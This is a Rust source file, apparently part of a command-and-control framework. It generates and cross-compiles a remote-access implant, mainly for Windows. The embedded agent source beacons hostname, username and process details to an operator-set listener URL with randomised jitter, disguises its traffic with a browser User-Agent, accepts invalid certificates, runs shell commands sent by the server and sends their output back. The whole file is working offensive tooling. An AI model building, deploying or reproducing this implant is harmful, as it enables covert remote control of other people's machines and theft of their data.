// src/agent/mod.rs - Working version with fixed string formatting
use std::io;
use std::path::Path;
use std::fs::{File, create_dir_all, remove_dir_all};
use std::io::Write;
use std::process::Command;
use serde::{Serialize, Deserialize};

#[derive(Clone)]
pub struct AgentGenerator;

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AgentConfig {
    pub listener_url: String,
    pub format: String,
    pub architecture: String,
    pub sleep_time: u32,
    pub jitter: u8,
    pub injection: String,
    pub output_path: String,
}

impl AgentGenerator {
    pub fn new() -> Self {
        AgentGenerator
    }
    
    pub fn generate(&self, config: AgentConfig) -> io::Result<()> {
        println!("Generating agent with config: {:?}", config);
        
        if let Some(parent) = Path::new(&config.output_path).parent() {
            create_dir_all(parent)?;
        }
        
        let wants_windows_exe = config.output_path.ends_with(".exe");
        
        if wants_windows_exe {
            println!("🎯 Targeting Windows executable (.exe)");
            if let Ok(_) = self.try_cross_compile_rust(&config) {
                println!("✅ Windows agent executable ready: {}", config.output_path);
                return Ok(());
            }
            println!("⚠️ Windows cross-compilation failed, trying native compilation...");
            if let Ok(_) = self.try_native_rust(&config) {
                println!("⚠️ Generated native binary: {}", config.output_path);
                return Ok(());
            }
        } else {
            if let Ok(_) = self.try_native_rust(&config) {
                println!("✅ Agent executable ready: {}", config.output_path);
                return Ok(());
            }
            if let Ok(_) = self.try_cross_compile_rust(&config) {
                println!("✅ Agent executable ready: {}", config.output_path);
                return Ok(());
            }
        }
        
        println!("⚠️ Direct compilation failed, creating standalone project...");
        if let Ok(_) = self.generate_standalone_project(&config) {
            return Ok(());
        }
        
        Err(io::Error::new(io::ErrorKind::Other, "Agent generation failed"))
    }
    
    fn check_rust_installation() -> Result<(), String> {
        if Command::new("rustc").arg("--version").output().is_err() {
            return Err("rustc not found".to_string());
        }
        if Command::new("cargo").arg("--version").output().is_err() {
            return Err("cargo not found".to_string());
        }
        Ok(())
    }
    
    fn setup_rust_environment() -> io::Result<()> {
        println!("🔧 Setting up Rust environment...");
        let _ = Command::new("rustup").args(&["target", "add", "x86_64-pc-windows-gnu"]).output();
        Ok(())
    }
    
    fn try_cross_compile_rust(&self, config: &AgentConfig) -> io::Result<()> {
        println!("🔨 Attempting cross-compilation to Windows...");
        Self::check_rust_installation().map_err(|e| io::Error::new(io::ErrorKind::NotFound, e))?;
        Self::setup_rust_environment()?;
        
        let temp_dir = "/tmp/c2_agent_cross";
        self.create_rust_project(temp_dir, config)?;
        
        let output = Command::new("cargo")
            .args(&["build", "--release", "--target", "x86_64-pc-windows-gnu"])
            .current_dir(temp_dir)
            .output()?;
        
        if !output.status.success() {
            let _ = remove_dir_all(temp_dir);
            return Err(io::Error::new(io::ErrorKind::Other, "Cross-compilation failed"));
        }
        
        let source = format!("{}/target/x86_64-pc-windows-gnu/release/agent.exe", temp_dir);
        if Path::new(&source).exists() {
            std::fs::copy(&source, &config.output_path)?;
            let _ = remove_dir_all(temp_dir);
            return Ok(());
        }
        
        let _ = remove_dir_all(temp_dir);
        Err(io::Error::new(io::ErrorKind::NotFound, "Binary not found"))
    }
    
    fn try_native_rust(&self, config: &AgentConfig) -> io::Result<()> {
        println!("🔨 Attempting native compilation...");
        Self::check_rust_installation().map_err(|e| io::Error::new(io::ErrorKind::NotFound, e))?;
        
        let temp_dir = "/tmp/c2_agent_native";
        self.create_rust_project(temp_dir, config)?;
        
        let output = Command::new("cargo").args(&["build", "--release"]).current_dir(temp_dir).output()?;
        
        if !output.status.success() {
            let _ = remove_dir_all(temp_dir);
            return Err(io::Error::new(io::ErrorKind::Other, "Native compilation failed"));
        }
        
        for source in &[format!("{}/target/release/agent", temp_dir), format!("{}/target/release/agent.exe", temp_dir)] {
            if Path::new(source).exists() {
                std::fs::copy(source, &config.output_path)?;
                #[cfg(unix)]
                {
                    use std::os::unix::fs::PermissionsExt;
                    let mut perms = std::fs::metadata(&config.output_path)?.permissions();
                    perms.set_mode(0o755);
                    std::fs::set_permissions(&config.output_path, perms)?;
                }
                let _ = remove_dir_all(temp_dir);
                return Ok(());
            }
        }
        
        let _ = remove_dir_all(temp_dir);
        Err(io::Error::new(io::ErrorKind::NotFound, "Binary not found"))
    }
    
    fn generate_standalone_project(&self, config: &AgentConfig) -> io::Result<()> {
        let project_dir = format!("{}_project", config.output_path.trim_end_matches(".exe"));
        create_dir_all(&project_dir)?;
        self.create_rust_project(&project_dir, config)?;
        println!("✅ Standalone project created: {}", project_dir);
        Ok(())
    }
    
    fn create_rust_project(&self, project_dir: &str, config: &AgentConfig) -> io::Result<()> {
        create_dir_all(format!("{}/src", project_dir))?;
        
        let cargo_toml = r#"[package]
name = "agent"
version = "0.1.0"
edition = "2021"

[[bin]]
name = "agent"
path = "src/main.rs"

[dependencies]
tokio = { version = "1.0", features = ["full"] }
reqwest = { version = "0.11", features = ["json", "rustls-tls"], default-features = false }
serde = { version = "1.0", features = ["derive"] }
serde_json = "1.0"
rand = "0.8"

[target.'cfg(windows)'.dependencies]
winapi = { version = "0.3", features = ["winuser", "processthreadsapi", "handleapi", "wincon"] }

[profile.release]
strip = true
lto = true
codegen-units = 1
panic = "abort"
opt-level = "z"
"#;
        
        let mut cargo_file = File::create(format!("{}/Cargo.toml", project_dir))?;
        cargo_file.write_all(cargo_toml.as_bytes())?;
        
        let main_source = self.generate_agent_source(config);
        let mut main_file = File::create(format!("{}/src/main.rs", project_dir))?;
        main_file.write_all(main_source.as_bytes())?;
        
        Ok(())
    }
    
    fn generate_agent_source(&self, config: &AgentConfig) -> String {
        format!(r#"use std::time::Duration;
use std::env;
use std::path::PathBuf;
use tokio::time::sleep;
use serde::{{Serialize, Deserialize}};
use std::process::Command;
use rand::Rng;

const LISTENER_URL: &str = "{}";
const SLEEP_TIME: u64 = {};
const JITTER: u8 = {};

#[derive(Serialize, Deserialize, Debug, Clone)]
struct Beacon {{
    id: String,
    hostname: String,
    username: String,
    os: String,
    arch: String,
    ip: String,
    pid: u32,
    current_directory: Option<String>,
}}

#[derive(Serialize, Deserialize, Debug, Clone)]
struct Task {{
    id: String,
    command: String,
    task_type: TaskType,
    created_at: u64,
}}

#[derive(Serialize, Deserialize, Debug, Clone)]
enum TaskType {{
    Shell,
    PowerShell,
    Upload,
    Download,
    Kill,
    Sleep,
    Cd,
}}

#[derive(Serialize, Deserialize, Debug, Clone)]
struct TaskResult {{
    id: String,
    command: String,
    result: String,
    success: bool,
    execution_time_ms: u64,
    current_directory: Option<String>,
    error_details: Option<String>,
}}

static mut CURRENT_DIRECTORY: Option<String> = None;

fn get_current_directory() -> String {{
    unsafe {{
        if let Some(ref dir) = CURRENT_DIRECTORY {{
            dir.clone()
        }} else {{
            let cwd = env::current_dir().unwrap_or_else(|_| PathBuf::from("C:\\")).to_string_lossy().to_string();
            CURRENT_DIRECTORY = Some(cwd.clone());
            cwd
        }}
    }}
}}

fn get_system_info() -> Beacon {{
    let hostname = env::var("COMPUTERNAME").or_else(|_| env::var("HOSTNAME")).unwrap_or_else(|_| "unknown".to_string());
    let username = env::var("USERNAME").or_else(|_| env::var("USER")).unwrap_or_else(|_| "unknown".to_string());
    let os = if cfg!(windows) {{ format!("Windows {{}}", env::var("OS").unwrap_or_default()) }} else {{ env::consts::OS.to_string() }};
    let arch = env::consts::ARCH.to_string();
    let pid = std::process::id();
    
    Beacon {{
        id: format!("agent-{{:08x}}", rand::thread_rng().gen::<u32>()),
        hostname, username, os, arch,
        ip: "127.0.0.1".to_string(),
        pid,
        current_directory: Some(get_current_directory()),
    }}
}}

async fn send_beacon(client: &reqwest::Client, beacon: &Beacon) -> Result<Vec<Task>, Box<dyn std::error::Error>> {{
    let response = client.post(&format!("{{}}/beacon", LISTENER_URL)).header("User-Agent", "Mozilla/5.0").json(beacon).timeout(Duration::from_secs(30)).send().await?;
    if response.status().is_success() {{ Ok(response.json().await.unwrap_or_default()) }} else {{ Ok(Vec::new()) }}
}}

fn execute_command(cmd: &str, task_type: &TaskType, task_id: &str) -> TaskResult {{
    let start_time = std::time::Instant::now();
    let result = if cmd.trim() == "help" {{
        ("BEACON HELP\\nCommands: help, whoami, hostname, dir, cd, ipconfig, tasklist, powershell, kill\\nExamples: cd C:\\\\Windows, dir *.exe, tasklist | findstr explorer".to_string(), true, None)
    }} else if cmd.trim().starts_with("cd ") {{
        let path = cmd.trim().strip_prefix("cd ").unwrap_or("").trim();
        if path.is_empty() {{
            (get_current_directory(), true, None)
        }} else {{
            match env::set_current_dir(path) {{
                Ok(_) => {{
                    let new_dir = env::current_dir().unwrap_or_else(|_| PathBuf::from(path)).to_string_lossy().to_string();
                    unsafe {{ CURRENT_DIRECTORY = Some(new_dir.clone()); }}
                    (format!("Directory changed to: {{}}", new_dir), true, None)
                }},
                Err(e) => (format!("Failed to change directory: {{}}", e), false, Some(e.to_string()))
            }}
        }}
    }} else {{
        let (program, args) = if cfg!(windows) {{ ("cmd", vec!["/c", cmd]) }} else {{ ("/bin/sh", vec!["-c", cmd]) }};
        match Command::new(program).args(&args).current_dir(&get_current_directory()).output() {{
            Ok(output) => {{
                let stdout = String::from_utf8_lossy(&output.stdout);
                let stderr = String::from_utf8_lossy(&output.stderr);
                let result_text = if !stdout.trim().is_empty() {{ stdout.trim().to_string() }} else if !stderr.trim().is_empty() {{ stderr.trim().to_string() }} else {{ "Command executed (no output)".to_string() }};
                (result_text, output.status.success(), if !output.status.success() && !stderr.trim().is_empty() {{ Some(stderr.trim().to_string()) }} else {{ None }})
            }},
            Err(e) => (format!("Execution failed: {{}}", e), false, Some(e.to_string()))
        }}
    }};
    
    TaskResult {{
        id: task_id.to_string(),
        command: cmd.to_string(),
        result: result.0,
        success: result.1,
        execution_time_ms: start_time.elapsed().as_millis() as u64,
        current_directory: Some(get_current_directory()),
        error_details: result.2,
    }}
}}

async fn send_result(client: &reqwest::Client, result: &TaskResult) -> Result<(), Box<dyn std::error::Error>> {{
    client.post(&format!("{{}}/task_result", LISTENER_URL)).header("User-Agent", "Mozilla/5.0").json(result).timeout(Duration::from_secs(30)).send().await?;
    Ok(())
}}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {{
    let client = reqwest::Client::builder().timeout(Duration::from_secs(30)).danger_accept_invalid_certs(true).build()?;
    let beacon = get_system_info();
    println!("Agent {{}} starting -> {{}}", beacon.id, LISTENER_URL);
    
    let mut failures = 0;
    const MAX_FAILURES: usize = 5;
    
    loop {{
        let mut current_beacon = beacon.clone();
        current_beacon.current_directory = Some(get_current_directory());
        
        match send_beacon(&client, &current_beacon).await {{
            Ok(tasks) => {{
                failures = 0;
                for task in tasks {{
                    println!("Executing: {{}}", task.command);
                    let result = execute_command(&task.command, &task.task_type, &task.id);
                    println!("Result: {{}} (success: {{}})", result.result, result.success);
                    if let Err(e) = send_result(&client, &result).await {{
                        eprintln!("Failed to send result: {{}}", e);
                    }}
                }}
            }}
            Err(e) => {{
                failures += 1;
                eprintln!("Beacon failed ({{}}/{{}}): {{}}", failures, MAX_FAILURES, e);
                if failures >= MAX_FAILURES {{
                    eprintln!("Too many failures, exiting");
                    break;
                }}
            }}
        }}
        
        let jitter = rand::thread_rng().gen_range(0..=JITTER) as f64 / 100.0;
        let sleep_time = SLEEP_TIME as f64 * (1.0 + jitter * if rand::thread_rng().gen_bool(0.5) {{ 1.0 }} else {{ -1.0 }});
        sleep(Duration::from_secs(sleep_time.max(1.0) as u64)).await;
    }}
    
    Ok(())
}}
"#, config.listener_url, config.sleep_time, config.jitter)
    }
}